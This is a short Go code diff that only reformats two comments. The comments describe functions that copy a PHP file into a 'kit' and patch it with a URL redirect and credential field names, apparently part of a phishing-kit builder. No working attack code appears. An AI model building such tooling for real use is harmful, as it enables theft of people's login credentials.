@@ -5,7 +5,7 @@ import (
 	"io/ioutil"
 )
 
-// CopyPhpToKit(phpfilename string, destFolder string): copy PHP file in destFolder
+// CopyPhpToKit (phpfilename string, destFolder string): copy PHP file in destFolder
 func CopyPhpToKit(phpfilename string, destFolder string) error {
 
 	// check if PHP file exists
@@ -22,7 +22,7 @@ func CopyPhpToKit(phpfilename string, destFolder string) error {
 	return nil
 }
 
-//  PatchPhp(phppath string, postLogin string, postPassword string urlin string): patch PHP with url redirection and correct names of attributes for credentials
+//  PatchPhp (phppath string, postLogin string, postPassword string urlin string): patch PHP with url redirection and correct names of attributes for credentials
 func PatchPhp(phppath string, postLogin string, postPassword string, urlin string) error {
 
 	// open new php file
